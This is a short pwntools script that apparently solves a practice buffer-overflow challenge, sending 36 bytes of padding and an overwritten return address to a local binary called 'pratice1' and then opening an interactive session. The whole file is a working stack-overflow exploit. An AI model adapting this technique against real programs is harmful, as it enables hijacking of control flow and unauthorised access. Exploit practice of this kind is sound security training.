from pwn import *

r = process('./pratice1')

eip = 0x080485E7

payload = 'a' * 36 + p32(eip)

r.sendline(payload)
r.interactive()

